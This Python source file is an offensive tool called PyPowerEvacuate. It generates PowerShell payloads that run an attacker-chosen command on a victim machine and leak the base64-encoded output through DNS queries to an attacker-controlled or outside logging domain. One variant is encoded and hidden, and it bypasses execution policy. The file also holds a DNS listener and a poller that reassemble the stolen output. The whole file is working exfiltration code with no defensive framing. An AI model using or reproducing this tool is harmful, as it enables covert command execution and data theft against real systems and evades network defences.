#!/usr/bin/python3
# PyPowerEvacuate v0.5 -8 August 2021-
import base64
import socket
import requests
import argparse
from time import sleep
from dnslib import DNSRecord
import warnings; warnings.filterwarnings('ignore', message='Unverified HTTPS request')

print('[#] PyPowerEvacuate')

parser = argparse.ArgumentParser()
parser.add_argument('-c', required=True, default=None, help='Set your command.')
parser.add_argument('-d', required=False, default=None, help='Set your domain name.')
args = vars(parser.parse_args())
command = args['c']

def generateCommand(domain, command):
    payload = f'$command = Invoke-Expression "{command}"; [string]$encodeCommand = $command; $encodedCommand=[' \
           'Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($encodeCommand)); $encodedCommand = ' \
           '$encodedCommand -replace "[=]", ""; $outputBs64 = $encodedCommand -split "(\w{62})" | ? {$_}; foreach (' \
           '$line in $outputBs64){Resolve-DnsName -Name ' \
              f'"$line.{domain}"' \
              '}; Resolve-DnsName -Name ' \
           f'"Close.{domain}"'
    print('[*] Choose one of these payloads.')
    print(f'\n[-] Payload 1: {payload}')
    print(f'\n[-] Payload 2: powershell -NoP -NonI -W Hidden -Exec Bypass -e ' + base64.b64encode(payload.encode('utf16')[2:]).decode()+'\n')

def customDomain():
    server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server.bind(('0.0.0.0', 53))
    outputs = []
    while True:
        data, addr = server.recvfrom(1024)
        dnsReq = DNSRecord.parse(data)
        dnsReq = dnsReq.questions[0]._qname
        data = str(dnsReq).replace('.', ' ').split()[0]
        if data == 'Close':
            encodeBase64Output = ''.join(outputs)
            decodeBase64Output = base64.b64decode(encodeBase64Output + '==').decode("utf-8")
            print(f'[-] Command output: {decodeBase64Output}')
            server.close()
            break
        elif data not in outputs:
            print(f'[Request] {data}')
            outputs.append(data)

def generateDomain():
    response = requests.get('https://log.xn--9tr.com/new_gen', verify=False).json()
    domainName = response['domain']
    key = response['key']
    token = response['token']
    return domainName, key, token

def getOutput(token):
    outputs = []
    while True:
        response = requests.get(f'https://log.xn--9tr.com/{token}', verify=False).json()
        if response == None:
            sleep(5)
            continue
        else:
            requestId = 0
            while True:
                try:
                    response = requests.get(f'https://log.xn--9tr.com/{token}', verify=False).json()
                    data = response[str(requestId)]['subdomain'].replace('.', ' ').split()[0]
                    if data == 'Close':
                        encodeBase64Output = ''.join(outputs)
                        decodeBase64Output = base64.b64decode(encodeBase64Output + '==').decode("utf-8")
                        print(f'[-] Command output: {decodeBase64Output}')
                        exit(0)
                    elif data not in outputs:
                        print(f'[Request] {data}')
                        outputs.append(data)
                    requestId += 1
                except KeyError:
                    print('[*] Waiting for new request ...')
                    sleep(5)
                    pass

def main():
    if args['d'] == None:
        print('[*] Generate domain ...')
        domain, key, token = generateDomain()
        print(f'[-] Domain: {domain}')
        print(f'[-] Token: {token}.')
        generateCommand(domain, args['c'])
        print('[*] Waiting for request ...')
        getOutput(token)
    else:
        print(f'[-] Your domain: {args["d"]}')
        generateCommand(args['d'], args['c'])
        print('[*] Waiting for request ...')
        customDomain()

if __name__ == '__main__':
    main()
